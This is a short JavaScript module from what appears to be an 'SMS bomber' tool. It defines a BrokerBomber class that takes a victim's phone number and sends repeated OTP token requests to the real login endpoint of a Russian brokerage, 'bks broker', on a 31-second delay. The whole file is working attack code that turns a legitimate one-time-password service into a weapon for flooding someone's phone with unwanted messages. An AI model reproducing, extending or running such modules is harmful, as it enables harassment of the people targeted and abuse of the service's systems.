const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class BrokerBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = this.formUrlEncoded({
            username: this.phone,
            grant_type: "password",
            client_id: "broker_otp_guest2_web"
        });
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "bks broker";
    delay = 31000;
    url = 'https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token';  
}
module.exports =  BrokerBomber;